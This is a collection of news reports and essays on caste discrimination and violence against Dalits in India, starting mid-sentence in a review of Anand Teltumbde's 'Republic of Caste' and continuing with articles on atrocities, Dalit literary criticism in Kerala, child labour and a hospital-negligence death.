1938, Ambedkar was still raising this issue. One would search in vain for any communist intervention here. The assumption that class unity could be achieved only by sweeping the caste fault lines under the carpet would eventually come back to haunt the communists. As Teltumbde notes, they tended to locate caste in the “superstructure,” even though caste locations were very often linked to production. On the other hand, he is deeply critical of latter-day Ambedkarite groups for their preoccupation with electoral politics. They were as opportunistic as the mainstream electoral CPs, and were quite aggressively anti-communist, as well as hero-worshipping Ambedkar. He argues that Ambedkar himself would have firmly rejected this approach. As the COVID-19 pandemic rages in India, memes have appeared on social media claiming that Indian doctors cannot treat patients properly because of reservations, which have supposedly eliminated the meritorious. This is a reference to the policy of affirmative action: the reservation of places in publicly funded schools and colleges for a range of socially deprived, historically oppressed and marginalized groups, with similar arrangements for public-sector jobs. As Teltumbde correctly says, any discussion of caste in India soon enough becomes a discussion of reservations. One might gather the impression from such debates that casteism would not be a serious issue were it not for reservations. Teltumbde’s take is a complex one. He is sharply critical of the elite and forward caste critics of reservations, who talk of “merit,” ignoring the social hierarchies that surround each individual. He notes that opponents of reservations ignore the fact that their much-revered Hindu social order was based on “reservations” of the worst kind. Brahmins did not have to display any merit to assume dominance over society; the untouchables did not have to commit any crime to be condemned for generations to a societal hell. At the same time, Teltumbde is skeptical about reservations based on caste, albeit for reasons very different from those of the Brahmanical elite. He points out that the logic of having a set of reserved seats in local, provincial, or central legislatures would have made sense only if there had been a separate electorate. Dalits being a small fragment of the population, even in reserved seats, and especially at the higher levels, the Dalit candidates most likely to win are those approved by the bourgeois parties, which are themselves dominated by the upper castes. As a result, the policy of reservations, instead of becoming a way to build a strong Dalit fighting force, has led to the co-option of a small layer of Dalit politicians. He argues that Panchayati Raj — a system of local self-government in rural districts — has become de facto ruled by the dominant castes. However, there are problems with Teltumbde’s arguments about reservations. It would be one thing if all the places available through the reservations policy had been filled up throughout India. But as Maroona Murmu of Kolkata’s Jadavpur University has shown, reservations have not been properly utilized, in spite of the egalitarian promises of the Indian constitution. Take one example Murmu gives from the higher-education system of West Bengal: in the 2014–15 academic year, out of 49,217 professors, just 3,037 came from Scheduled Castes (6.16 percent), and a mere 451 from Scheduled Tribes (less than 1 percent). The core argument Teltumbe makes is for a strategy that brings class and caste together. This does not mean endorsing the fakery of “economic reservation,” whereby the authorities are to reserve seats for the “poor,” rather than simply on caste grounds. Since the reservation policy is intended to deal with forms of social exclusion that are similar to racism, it is not related to poverty. If poor students lack the necessary resources, the answer is to provide more funding for the education system. Teltumbde believes that there is a need to reform reservation strategies at the very least. If caste has to be annihilated — as Ambedkar demanded in a famous pamphlet — then a caste-based reservation policy, operating in an environment where only untouchability is abolished, not the caste system itself, does not really seek to get rid of social inequality and oppression. Dalit intellectuals and activists had hoped that the untouchable castes who were at the forefront of the original struggles led by Ambedkar would forge a broader unity among various oppressed Dalit subcastes. The Bahujan Samaj Party (BSP) is based on this conception — the term “Bahujan” referred to all non-elite castes. In practice, however, instead of building such unity, those castes projected themselves as superior and tended to concentrate advantages for their own benefit. Although the BSP has been the most successful of all the attempts to build up a Dalit-based electoral party, it has disproportionately favored its core component, the subcaste of Jatavs/Chamars. The Hindutva forces identified this limitation better than anyone else. By supporting politicians of non-Jatav Dalit castes, the Bharatiya Janata Party (BJP) was able to eat dramatically into the electoral base of the BSP in Uttar Pradesh (UP). One chapter of Teltumbde’s book contains a valuable discussion of the BSP. It is not a Dalit party by self-definition: its name expresses its hope to constitute a majority bloc that would be wider than Dalits. In practice, even in UP where the BSP has been a regular fixture in coalition governments, it has not succeeded in winning support from shudras at the bottom of the caste hierarchy (now categorized among Other Backwards Classes or OBCs). Recent attempts to enlist Brahmins and other elite groups to the party’s side have eroded the Bahujan identity. Teltumbde does not make the same arguments as right-wing critics of the BSP, and points out the double standards of those critics, who never subject the BSP’s rivals to the same harsh scrutiny. However, he believes that the BSP has largely ceased to be a vehicle that can truly fight for Dalit emancipation. In several chapters, Teltumbde takes on the role of the Indian state, examining its violence towards Dalits and its handling of dissent, even though it routinely claims to be the “world’s largest democracy.” His book contains a detailed account of the Khairlanji massacre of September 2006. An upper caste mob murdered an entire family of Dalit Mahars, the Bhotmanges: the women were paraded naked and gang-raped before being killed, the genitals of the two boys were crushed with stones, and all the bodies were thrown callously into a canal. In contrast with many other such cases, the government had to take action of some kind because of protests initiated by local Dalit women and taken up by Dalits elsewhere. Having been forced to assign the case to a fast-track lower court, the government made sure of the appointment of a public prosecutor who would present a weakened brief. This court was supposed to apply the Scheduled Caste and Scheduled Tribe (Prevention of Atrocities) Act of 1989, which Rajiv Gandhi’s government had passed under pressure from Congress supporters among minority groups (Dalits, Adivasis, and Muslims). The legislation strengthened the penalties for discriminatory acts of various kinds. However, the court concluded that there was no caste angle to the crime, and so the Act did not apply. Nor did it see any grounds to consider “outrage to women’s modesty” (Victorian legalese for sexual violence). The court also ruled that the crime was not premeditated. As Dalit organizations and civil rights groups argued, all three findings flew in the face of the evidence. Although several fact-finding reports had revealed that between 40 and 60 people were involved in the assaults, only 11 faced charges. The six who were sentenced to death had their sentences commuted to life imprisonment by the High Court of Bombay. It is not even clear if the principal culprits were put on trial. In his analysis of the case, Teltumbde makes a number of points. The Bhotmange family had broken caste codes; they were assertive, and hence they had to be “put in their place.” At each stage, there were Dalits (Mahars) present — in the administration and the local police force, and among the doctors who performed and supervised the autopsies. For Teltumbde, this shows that merely having some Dalits in important posts will not address the systemic oppression and violence suffered by Dalits as a whole. India’s social transformation since independence had turned rural Dalits into a part of the agricultural proletariat. Violence against Dalits therefore often has a dual character, with a specific caste-based motivation and a broader class-based one, buttressed by the sense on the part of rural capitalists that Dalits in particular are deserving of such violent treatment. Lax in its handling of violence against Dalits, the Indian state is quick to deploy repression against them for dissent. The authorities frequently label Dalits and other groups — notably Adivasis — as Maoist or Naxalite subversives if they protest about anything, using anti-sedition laws inherited from the colonial state, along with the more recent Unlawful Activities Prevention Act (UAPA). Arrests of Dalit activists under these laws are commonplace: many spend years in prison awaiting trial, denied access to bail, only to be released when the courts find them innocent. Teltumbde’s own arrest under the UAPA is yet another confirmation of how accurate his indictment of the Indian state is. Violence against Dalits is greatest in Narendra Modi’s own state of Gujarat. The author discusses how Gujarat became the region where Hindutva forces succeeded in winning support from Dalits, despite their own aggressive casteism. But the state’s experience also shows how Dalit politics can be shaped in a different way. It is Dalits who flay and dispose of dead cattle. In July 2016, a so-called cow-protection group assaulted a Dalit family at Una because they were skinning a dead cow. Dalits, led by a young man, Jignesh Mewani, responded by boycotting this form of work, as well as the cleaning of sewers. They sought to earn their livelihoods in alternate ways by demanding land from the state government. The state government had formally allotted over 160,000 acres of land to Dalits three decades earlier, but the land was never actually handed over. The agitation led to the immediate transfer of 300 acres, which did have a positive symbolic impact. As Teltumbde reminds us, while Ambedkar himself stressed the importance of land rights, the mainstream Ambedkarite movements have not pushed for this as a route to greater emancipation. By the end of 2019, Dalits had received about three thousand acres of land — slight progress, albeit at great cost. Elsewhere, the author explores the arguments put forward by a section of the Dalit middle-class intelligentsia, who depicts neoliberalism as a caste-neutral system. The Bahujan Samaj Party voted in favor of the proposal to open up India’s retail sector to foreign capital, which would allow companies like Walmart to enter the country. Defending this move, these intellectuals suggested that foreign investment would be beneficial for Dalit entrepreneurs, as it was not casteist. Teltumbde rebuts the claim that neoliberalism has been or will be comparatively beneficial for Dalit capitalists. He looks at sectors where Dalit capitalism is meant to have been a success, suggesting that these are simply extensions of the old, caste-based Dalit occupations. And as Teltumbde points out, the Dalit Indian Chamber of Commerce and Industry has acknowledged that there is really no “level playing field,” even among capitalists, by seeking to have the reservation policy applied. He compares the rhetorical function of “Dalit capitalism” in India to that of “black capitalism” in the United States, as a diversion from the real struggle for emancipation. Teltumbde directly confronts the attempt by Hindutva forces to co-opt Ambedkar. M. S. Golwalkar was the second of the Supreme Leaders (Sarsanghchalak) of the Rashtriya Swayamsevak Sangh (RSS), and the architect of its key theoretical ideas. When we look at Golwalkar’s writings, it is easy to see how he identified Muslims, Christians, and communists as the enemy. But Golwalkar and his co-thinkers also had to bring the Dalits into the fold, in order to construct a homogeneous Hindu majority against these alleged enemies. This posed a serious problem. When Balasaheb Deoras was chief of the RSS, the group’s leaders attempted to win over Dalits. In pursuit of this goal, they put about a fable concerning the alleged friendship between the RSS founder Keshav Baliram Hedgewar and Ambedkar, and attempted to depict Ambedkar as having been hostile to Muslims and communists, and as a champion of Hindus. In response to this, Teltumbde cites Ambedkar’s 1945 work, Pakistan or the Partition of India, where he wrote the following: If Hindu Raj does become a fact, it will, no doubt, be the greatest calamity for this country. No matter what the Hindus say, Hinduism is a menace to liberty, equality and fraternity. Teltumbde presents a wealth of information to show that the practice of the RSS–BJP is entirely at odds with Ambedkar’s thinking, and utterly hostile to any notion of genuine equality with or for Dalits. He also puts forward stinging condemnations of the BJP’s principal rivals, the once-dominant Indian National Congress and the recently formed Aam Aadmi Party (AAP). He criticizes the AAP, which mobilized support on an anti-corruption platform, for refusing to face up to caste and capitalism as structural realities in India, and attacks the Congress for its historic opportunism towards Dalits. The party has treated them as vote banks, to be placated with tokenistic measures, without ever being allowed to stand on their own feet or to achieve meaningful equality. Teltumbde sharply disputes the Congress claim to have represented Dalit interests: despite decades of post-independence Congress rule, about nine Dalits in ten still lead impoverished lives as landless laborers, small-scale farmers, village artisans, slum-dwelling casual workers, and peddlers in the informal sector of the urban economy. As the author recalls, Mahatma Gandhi rejected the idea of a separate electorate for Dalits. His 1932 agreement with Ambedkar, the Poona Pact, made Dalit representation subject to the votes of their oppressors, the upper castes, through reserved seats. The Simon Commission had proposed separate electorates, which would have meant Dalit voters alone would elect the Dalit candidates. Gandhi saw this as a blow to the Hindu community and religion. Bringing nation and religion together long before the current Hindutva leaders, he went on hunger strike, demanding an end to the separate electorate for Dalits. Gandhi’s supporters threatened Ambedkar, warning that if their leader died, they would take revenge on people from the Depressed Class people. The result was the Pact, which Abedkar felt compelled to sign. It increased the number of Dalit seats; however, since the electorate was a common one, Dalits were mostly dependent on support from voters and parties of higher castes. This has remained the case to the present day. Republic of Caste, on a careful reading, presents the reader with a picture that differs sharply from two forms of congealed orthodoxy: the rhetoric of liberal modernization, which deems Indian-style neoliberalism to be necessary for progress, or the kind of Marxism that presents India as a semi-feudal, semi-colonial economy. Some questions remain. The most important is his critique of identity politics, and his desire that all subcastes of Dalits should be consolidated into a class. Yet Dalits are socially differentiated: as Teltumdbe himself records elsewhere, some 4 percent of the Dalits form a middle class. So who is a Dalit? The identity is actually a political project, as is the BSP’s Bahujan. Secondly, after years of Dalit feminism, it is disappointing that Teltumbde does not examine the relations between class, caste, and gender, apart from his examination of repression, rape, and sexual violence. Economic and Political Weekly has published several important essays on this triad, including a dialogue between Gopal Guru, Sharmila Rege and Chhaya Datar. Overall, however, this is a careful work, which distinguishes between those the author sees as opponents within a zone of possible engagement, like the BSP and the Indian left, and those he considers forces of exploitation and oppression, namely Hindutva, the mainstream bourgeois parties, and capitalism. It should become a touchstone for discussion among radical Dalit organizations and sectors of the Marxist left. https://www.jacobinmag.com/2020/07/dalit-india-ambedkar-teltumbde Kamayani Bali – Mahabal – A Kractivist with Multiple Personality Disorder ( MPD) which encompasses a clinical psychologist, journalist, lawyer and activist.

The Aroor police have registered a case against Gopi of Ezhupunna under Sections 341 (punishment for wrongful restraint) and 323 (punishment for voluntarily causing hurt) of the Indian Penal Code along with relevant sections under the Scheduled Castes and Scheduled Tribes (Prevention of Atrocities) Act. The police said the Kerala High Court prevented Gopi’s arrest after he moved an anticipatory bail application on Thursday. As per a complaint filed by the parents of the victim, the boy, along with his friend, had gone to bathe in the pond of the Sree Narayanapuram Mahavishnu temple, Ezhupunna, following a disruption in the water supply on March 6. The victim was blocked from entering the pond by Gopi stating that people of the Dalit community should not take bath in the temple pond. He then released air from the tyre of the victim’s bicycle. The boy questioned this and the accused beat him on his neck and punched him on the stomach. “After getting information, I reached the spot and saw Gopi brutally assaulting my son and immediately took him to the Thuravoor taluk hospital. I came to know that Gopi used to scold and attack other children too. The incident has nothing to do with the temple committee,” said the father of the victim. After spending a couple of days at the hospital, the boy was discharged earlier this week to write the Secondary School Leaving Certificate (SSLC) examination. The accused, a retired railway official, reportedly is of the Kudumbi caste. Sasi Kumar, secretary, Sree Narayanapuram Mahavishnu Temple Dewasom, said that the pond was opened to all irrespective of religion and caste. “The incident has nothing to do with the Devaswom. It was an issue between individuals. People from all religions use the pond. It will remain like that,” he said. Mr. Kumar added that the accused was not a member of the temple committee. The police investigation into the incident is led by Cherthala Deputy Superintendent of Police A.G. Lal.

0," Dr Ajay Sekher  The contemporary critical practice that evolves within the Dalit writing in Malayalam is vibrant with a variety of voices and divergent perspectives. There is an increased presence of people from all walks of life cutting across age, gender and community here. The diversity and difference that exist in the socio cultural life of the marginalized also get reflected in their intellectual and cultural interventions.  We have intellectuals engaging with historiography, literary and cultural criticism, social and political commentary, activist propaganda and other modes of critical enquiry. Though they differ in various issues and points of view the ideological underpinning is the social justice and democracy paradigm embedded in the works of Dr Ambedkar. The significance of Ambekar is that the democratic movement he led was a historic act for regaining the voice and agency of the subaltern in India silenced and crushed for many millennia (Omvedt). It was a radical attempt to break “the silences of centuries that brood over the history of invasion and colonization” as Toni Morrison puts it while looking at the history of racism in her Afro American context (Morrison).  The intellectual legacy and cultural trajectory of Ambedkarism in this critical context is not just a 20th century development but a culmination of more than two millennia old indigenous resistance against barbaric invasions and cultural colonizations. The most eloquent articulations of this protest can be identified in the challenge of Buddhism against caste and Brahmanism, the pre Buddhist Kapila, Charvaka and Ajeevaka traditions (Sekher). The Sramana tradition of various schools of Buddhism and Jainism became the rock bed of alter-native epistemologies and cosmologies in India. It is all the more relevant in South India and Kerala that was part of the ancient Tamilakam.  All our epics the Silapatikaram, the Manimekhalai etc. were Buddhist and Jain masterpieces (Pavanan). Most of the major temples now in the custody of Savarnas or the self-fashioned cultural elites of Kerala, that are more than a millennia old, were Buddhist and Jain ones brutally Brahmanized through extreme forms of violence, persecution and systematic cheat (Valath). Onam and Maveli again hint to this erased historic truths. Sahodaran Ayyappan also known as “Pulayan Ayyappan” reminds us about this suppressed past in his poem “Onappattu” (Ayyappan). The culture and tradition of the whole of India especially south India and Kerala in particular were based on Buddhist, Ajivaka and Jain Sramana teachings. Pivotal importance was given to Dharma or ethics and egalitarian human dignity in these traditions. The Ajivakas, the Jews, Christians, Muslims and Sufis have also historically contributed to the development of the composite culture of Kerala (Ramachandran).  Ambedkar considered the Buddha, Kabir and Phule as his teachers. This again explains the great genealogy of counter hegemonic resistance in India cutting across time and space. So the moment one chooses to adopt an ideological affiliation to Ambedkarism she chooses this long Bahujan legacy of intellectual and cultural struggle against Aryan invasion and Brahmanical epistemology and cultural hegemony.  This is the cultural juncture in which a Dalit intellectual like K K Kochu intervenes in the production and dissemination of knowledge, especially in something referred to as history. His ongoing project to reread and rewrite the history of Kerala from an indigenous perspective is a critical subversive project to de-legitimize mainstream history that is encoded in the epistemes and semiotics of hegemony. It evolves from the Dalit realization that the academic mainstream often reiterates and reproduces hegemony. It is a struggle, in this hegemonic context to develop a perspective from below, “a frog’s perspective,” as contemporary Afro-British intellectual Paul Gilroy had it (Gilroy).  Kochu traces the presence and indelible imprints of basic communities from Sangham era onwards and critically marks the onslaught of invasion in the fifth and sixth centuries A D. The loss of land and the beginning of slavery is thus scrutinized in hindsight. His deconstructive reading in canonical Malayalam literature is also remarkable. He had aptly pointed out the absence of Dalits in Chandu Menon’s Indulekha, a pioneering novel in Malayalam and the Sudra-centrism of Malayalam cinema (Kochu). His contributions largely fill the vacuums and gaps found in the mainstream historiography and cultural criticism in Kerala today.  Another important writer-activist in the field of Dalit-Adivasi movement is K M Salimkumar. He is a leading intellectual and orator apart from his critical writings on contemporary social and political processes (Salimkumar). He is an ardent critic of anti subaltern policies of the state as well as anti democratic tendencies in the middle classes. His studies on the shortcomings of the implementation of reservation policy, reservation and private sector and social commentaries on important political developments that affect the excluded are valuable as far as participatory democracy and inclusion in our society is concerned. His political critique is pungent and literally nuanced.  K K Baburaj’s interventions in the field of Dalit literary criticism are commendable. He struggles to formulate a Dalit theoretical stand point position in his analyses. His studies on Pattathuvila, V K N, K J Baby and other luminaries in Malayalam are atypical (Baburaj). His intense engagement with language, the obsessive indulgence in idiom, the struggles to delve deep into theoretical inter-discourses and philosophical obscurantism often expel the common readership but appeal to the specialized. He has also touched upon popular film and music in his critical exercise. His mature contributions are yet to come.  Sunny M Kapikkad is a young fire-brand spokesman and activist-critic of the Dalit cause in Kerala. His writing and speeches are charged with the spirit of liberation and retribution. He is at the helm of all Dalit struggles in Kerala today, whether it is for land or for political rights. His critical practice is very much linked to his community work and social activism. He has plenty of years of experience in social activism at the grass root level and has widely published on Dalit issues (Kapikkad). He is again going to make the future of Dalit cultural politics in Malayalam a turbulent and happening space.  Pradeepan Pampirikunnu has also established himself as a Dalit critic operating in a fairly balanced academic framework. His studies and analyses done from a specifically Dalit perspective are illuminating and scholarly. His pioneering work on Dalit Studies is a unique attempt to historicize and critically textualize this new mode of writing in Malayalam (Pampirikunnu). The critical scholarship of Pradeepan is of immense value to the future developments of our field of enquiry.  Another young scholar and critic is V V Swamy. He is also active as a teacher, community organizer and social worker. He has compiled and edited the songs of Poykayil Appachan (Swamy). He has authored many works on the PRDS movement. His literary studies are tinged with sharp social and political critique. His writing is marked for its simplicity and clarity. His focus on education and the public sphere for analysis is again significant as far as the common people are concerned.  There are also plenty of new and upcoming youngsters in Dalit critical practice today. A Arun, K V Sasi, O K Santhosh, K K Shinymol to name a few promising futures. They all address and interrogate the issues of cultural exclusion and marginality in the context of caste and Brahmanism from their specific locations of culture within Kerala. Though they differ in their methodologies and ideological affiliations their thrust is to analyze sites of power and subordination. They try to deconstruct hegemonic and fascist narratives and worldviews. They resist hegemony and disseminate the cultural capitals to the denied and subjugated. They try to reread the canon and rewrite the aesthetics in an egalitarian and ethical manner. They are also providing critical backup to the new writing emerging from the Dalit authors themselves.  But unfortunately some of them are adopting an exclusive rather than an inclusive critical practice. They should get rid of their exclusivist fundamentalism that sabotages larger political formations, alliances and possible democratic futures. The visions and agendas of the Dalit writers should enlarge and encompass the greater questions of inclusive social democracy envisaged by the Lokayathas, the Buddha, Kabir, Phule, Ambedkar, Vaikundha Swamy, Narayana Guru, Ayyankali and others. They should not forget that they are the torch-bearers of this indigenous democratic tradition, the Bahujan or peoples’ culture in India. They should not be carried away further by the divide and rule strategy of Brahmanical imperialism (old and new) that has been enslaving them for the last three or four thousand years (Pandian). They are to be extremely vigilant about the cleavages projected by the Vamana ideology that covertly tries to create splits and schisms in the solidarity of the basic communities and aborts the radical brotherhood among the former untouchables and Chandals. If Sudras can de-link from the Brahmanical meta-referntial structure let them also join this great people’s movement, the Bahujan cultural politics and tradition of India.  The emerging critical writers should realize the importance of Dalit Buhujan solidarity, a broader liberating alliance of the people subjected and exploited by Hindu colonization for centuries. They must acknowledge and emphasize the fact that only such an emancipating alliance of the outcastes, women and non-elite minorities in India can effectively initiate social change, sustain democracy and resist cultural nationalism and fascism in Kerala and India in the 21st century. The challenges are complex and plural and so need to be the countering critical and democratic projects. This is the serious and strategic task ahead for the new Dalit critical writers.  ~~~  Works Cited  Ayyappan, Sahodaran. Padya Krithikal. Thrissur: Kerala Sahitya Academy, 1991(1934).  Baburaj, K K.

0,"Jump to navigation Speak Now Following an incident in the Achhnera area of Agra where a Dalit woman's body was removed from a burning pyre by upper-caste men, BSP chief Mayawati has demanded that the Modi government to order an inquiry into this incident and punish the culprits strictly so that such incidents are not repeated. Mayawati said that the Modi government should leave its casteist mentality aside and provide monetary assistance to the affected family. The incident took place in the Raibha village of Achhnera block in Agra where a woman's cremation was stopped by upper caste men on July 20, but the police did not take any action even after eight days of the incident. The woman had to be cremated outside the crematorium because of the protest by upper caste residents of the village. The local police did not take action against the culprits and kept trying to force a compromise. The police also made them perform the cremation outside the crematorium. After videos of this incident went viral, the SSP Bablu Kumar has taken cognizance of the incident, setting up a team led by the circle office Achhnera and asked to submit a report. 25 people have been booked under Section 151 of the CrPC. CO Achhnera VS Beer Kumar said the police had immediately reached the spot upon receiving the information but the affected family did not want any action to be taken against the culprits. Bhagwan Singh of Raibha said there are about 24 families of Dalits in Raibha and they want action to be taken against the culprits, they will not say anything. Congress city president Devendra Kumar Chillu told India Today that it is a shameful incident and there should be a high-level inquiry into the incident.He said the Modi government and its supporters are trying to suppress the Dalits and backward classes, but they will not succeed in this motive as the Congress will unite the Dalits, Muslims, and backwards against UP's Yogi government and Centre's Modi government, throwing them off. He demanded that the inquiry should be done by a retired judge. Minority leader and Bhartiya Muslim Vikas Parishad Chairman Sami Aghai said that the current government's slogan 'Sabka Sath Sabka Vikas' is the biggest farce as this government thinks of the 'Vikas' of the upper caste Hindus only, sowing seeds of hatred against the Muslims, Dalits and backwards in their minds. He added that the Achhnera incident is very shameful and strict action should be taken against the guilty. He said that a dead body has no caste and crematoriums and graveyards should not be allowed to be segregated according to castes.

0,"Everything is Written Here A report published by the human rights NGO Arisa has found that children under 14 years account for over 18% of the workforce in the cottonseed farms surveyed, with over 50% of the child labourers in the sector being Dalits or Adivasis. The majority of the child labourers were not attending school. The report Sowing Hope, which examines child labour and wages in cotton and vegetable seed production in India, says that while still too high, the total amount of child labourers has in fact declined since 2015, due to initiatives by companies and NGOs. The report however does find that wages across the sector are still far from the minimum wage, a figure which has not improved significantly. The prevailing wage rates were found to be 24-41% below minimum wage in some Indian states. The researchers also found differential treatment of Dalits in the workplace with reports of Dalit workers being treated differently to dominant castes and not being given the same privileges in relation to taking breaks during work hours or being treated with respect and dignity. 613 sample farms were surveyed showing a direct correlation between the decline of child labour in companies who have implemented special programmes to address this issue in relation to those who have not yet tackled the problem. International Dalit Solidarity Network welcomed ‘Sowing Hope’ and urged companies looking to address child labour and the working conditions in the seed sector to address caste discrimination directly, as it is a key root cause of child labour, also evidenced by the large percentage of Dalits engaged in this work as documented. “This caste dimension is also witnessed in many other sectors including Leather, Stone and Minerals, Construction, Carpet Weaving as well as across the Garment and Agriculture sectors,” it said."

A Dalit lawyer and activist in Gujarat’s Kutch district was on Friday killed by a man from Mumbai, allegedly over his social media posts criticising Brahminism, The Indian Express reported. The accused and five other suspects were arrested on Saturday. The lawyer, Devji Maheshwari, was a senior member of the Indian Legal Professionals Association and the All India Backward and Minority Communities Employees Federation. An unidentified Crime Branch official in Mumbai told the newspaper that the accused, identified only as Raval, had threatened Maheshwari in the past too. They both belonged to Rapar town in Kutch. “Maheshwari wrote and shared posts critical of Brahminism on his Facebook page,” the official said. “Raval disagreed with those views and warned Maheshwari on several occasions to refrain from writing such posts publicly.” Maheshwari’s last post on Facebook post was a video of Backward and Minority Communities Employees Federation National President Waman Meshram saying that members of Scheduled Castes, Scheduled Tribes and Other Backward Classes were not Hindus. The police said that the accused, who works at a stationary shop in Mumbai’s Malad suburb, travelled to Rapar on Wednesday. CCTV footage of the incident on Friday showed Raval following Maheshwari into his office building and running out just seconds later. He was stabbed to death, according to The Hindu. The accused was charged for murder and criminal conspiracy and under sections of the Scheduled Caste and Scheduled Tribe (Prevention of Atrocities) Act, 1989. He was arrested by a team of the Gujarat Police. The police named nine other people in the first information report too and arrested five of them. The others are still missing. The lawyer’s killing sparked tensions in Rapar town as members of the Dalit community demanded action against the suspects. Maheshwari’s family named nine suspects and refused to accept his body till all of them were arrested. Inspector General of Police (Border Range) J R Mothaliya said that the motive behind the murder is yet to be established. Local Dalit activists and the lawyer’s family alleged that he was killed over a property case. Gujarat MLA Jignesh Mevani shared a video of Maheshwari’s wife protesting and demanded that the accused by arrested. “This woman is my hero!” he tweeted. “She has refused to eat and is fighting to bring justice to her husband, a fantastic BAMCEF activist and lawyer, who was brutally killed yesterday in Gujarat’s Rapar. I cannot imagine the pain she must be going through!” He added: “If you have some guts then arrest Devji Maheshwari’s killers, Mr Vijay Rupani. “Are you so toothless that you cannot find murderers in Gujarat? Where is your intelligence unit of police?

0,"Lucknow, July 28 : A Dalit woman’s body was unceremoniously removed from the funeral pyre minutes before she was to be cremated by upper caste men in Agra a few days back. The incident has now snowballed into a major controversy after video of the act went viral on social media. Bahujan Samaj Party (BSP) president Mayawati on Tuesday hit out at the Yogi Adityanath government in Uttar Pradesh and demanded a high-level inquiry into the incident. In a tweet, Mayawati said, “In UP near Agra, the body of a Dalit woman was removed from the cremation ground by people of upper castes having casteist mentality because the cremation ghat belonged to upper castes. This is most shameful and most condemnable.” In another tweet, she said, “In this casteist and most disgusting incident, a high-level inquiry should be conducted by the UP government and the culprits should be given harshest punishment so that such incidents are not repeated in the future. This is the demand of the BSP.” The body of the 26-year old woman was removed from the funeral pyre in Agra about a week ago by the Thakur community who said this cremation ground is not meant for people from Dalit community. Mayawati also raised the issue of the death of a Dalit doctor in Delhi who died due to coronavirus. The BSP chief in her tweet said, “The Delhi government should shun its casteist mentality and extend all help to his (doctor) family who had taken loan for his education,” she said."

Once Surya was admitted to Citizens, the presiding doctor recommended an immediate cerebral surgery after running the diagnosis and tests. Subsequently, all was done and all arrangements were made in accordance with the instructions and demands of the hospital. A Rapid antigen test was run by Citizens hospital in which Surya was tested COVID-19 negative. However, the following day the hospital refused to operate without running a full COVID-19 RTPCR Test. Thus, on August 18, the sample for RTPCR test was collected. In the duration of the next 24 hours that followed, Surya was kept in the Isolation Ward and his friends/points of contact were kept in the dark about the treatment and the prognosis and were not even allowed to visit him. Finally, the next day, that is, the August 19, Citizens Speciality hospital declared that Surya had tested positive for the Novel Corona Pathogen and consequently denied any further treatment. A bill of 56 thousand INR was presented by the hospital on the first account, however, they later kept haggling for 86 thousand INR, as Surya seemingly did not qualify the terms and conditions of the insurance (according to the insurance claim desk at Citizens). Precious time was wasted in this commotion, time that was of critical importance. In the meanwhile, an anxious friend who had slipped into the Isolation ward found Surya convulsing and immediately informed the doctors. By this time Surya’s cognitive functions had taken a hit, his overall health condition deteriorated insomuch that he had to be put on ventilator support, for 2 hours of which the total bill was rounded off to around 1.57 lakhs INR as opposed to the previously mentioned 1.12 lakhs INR. Ruckus followed over the exorbitant and capricious billing. The hospital reception maintained that since Surya is not enrolled, (despite still being a registered student in the university) hence the 40% rise in the total payable and only after a lot of deliberation did Citizens Speciality reception settle for the previously agreed 1.12 lakhs INR. Arrangements were made and Surya was immediately shifted to the Continental Hospital, where the doctors told his friends and family that Surya had only a very slim chance of survival since the damage was irreversible. In the next several hours that followed, he developed edema and multiple organ failures. Finally at 9:30 A.M, on August 20, 2020, Surya was declared brain dead before succumbing to his ischemic clots on August 21, 2020 at 4:11 PM. Was it not the negligence and criminal dereliction of duty on the part of Citizens Speciality Hospital that led to the tragic end of an inspiring life that held out hope to many? His points of contact who were rather wary of the result of the COVID-19 test run at Citizens had already applied for an RTPCR test at Continental and the test results showed the Surya had not contracted the virus. Moreover, a third RTPCR test, to reassess the previous RTPCR, confirmed that Surya was COVID-19 negative. Lest there be any room left for doubt over Surya’s test results at Citizens Speciality Hospital, another Antibody (IgA, IgG, IgM) test from Continental Hospital detected Surya non-reactive effectively corroborating he could not have contracted the C19 virus anytime in the past week. This establishes beyond doubt the criminal magnitude of the negligence and recklessness on part of citizens hospital that cost Surya his life. Also, the erroneous result of the RTPCR test conducted by Citizens Hospital, wherein Surya had tested COVID-19 positive, created considerable panic and concern among his attendants, friends and family. “Since Citizens Hospital already had a protocol regarding the non-admittance of COVID-19 patients and since they also knew that Surya’s case was an emergency and that he was in a critical condition that needed immediate surgery, they shouldn’t have admitted Surya, in the first place and asked him to be taken to a different hospital”, said Faizan, a PhD scholar from MANU, an AISA activist and a close friend to Surya. He also added, “However Citizens recklessly went ahead and admitted him and kept him in their facility for over 24 hours without any proper treatment, which proved fatal for my friend. The Hospital had kept us in the dark regarding both their protocols and the treatment.” Such negligence, apathy and sheer unprofessionalism are a shameless violation of societal protocols and the Hippocratic Oath that binds all healthcare workers. Coming from a marginalized (Dalit) section of the society, Surya was a first-generation learner and braved many odds to carve his place in academia. Surya was an eminent scholar and a substantial presence in various student movements for social justice. His parents who are daily wage labourers and a brother, a migrant labourer in Mumbai harboured high hopes on him and his bright future could have been a ministration for the rehabilitation of his community and class. Should such negligence to liability, tantamount to murder, go unpunished it would be a blemish on the democratic machinery of the country? His friends and family have demanded a fair, independent and thorough investigation into the issue. The tragic demise of Surya Pratap Bharti could have been avoided with adequate medical intervention and proactive response by the hospital authorities. Citizens Speciality hospital’s criminal negligence apart, Surya’s case foregrounds the consequences of the lack of quality and affordable public health care system. With the government investment in public health less than 1.5% of the GDP, the state of public health care in India, is abysmal, to say the least. The pandemic has further clearly shown how unaffordable and alienating the health care system in India is for the disadvantaged and marginalized sections of the society. In a landmark Supreme Court judgement, Paschim Bangal Khet Mazdoor Samity vs State of West Bengal (1996), the Supreme Court upheld the right of any seriously ill to get hospitalization for life-saving medical aid at any government hospital. However, the grim reality of Indian public healthcare system is such that it is grossly understaffed and operates with deplorable technological and logistical infrastructure and medical equipment. Although Article 21 ensures the right to life, problems persist, one, of the fact that it only applies to government healthcare facilities, which often prove counterproductive in emergency medicare. It is shameful that we do not have any systematically enforced mechanism to provide affordable health care to the most socio-economically disadvantaged sections of our society and that a scholar, who had bravely crossed so many social and economic barriers to pursue a doctorate from one of the country’s finest institutions with a scholarship had to fall prey to the criminal medical negligence of a private hospital. Besides, most private hospitals charge arbitrarily since the states do not practice standing authority to standardize medical prices and rates. It is as if indifference has been institutionalized. The government’s policy of manic privatisation across all sectors, disastrous as they are, in the education and public health sector, in particular, would toll the death knell for social justice in our society. This tragedy is a case in point. The corona virus pandemic has only exposed the rampant negligence, corruption and inadequacy present in Indian healthcare system that has always been present even prior to COVID – 19.

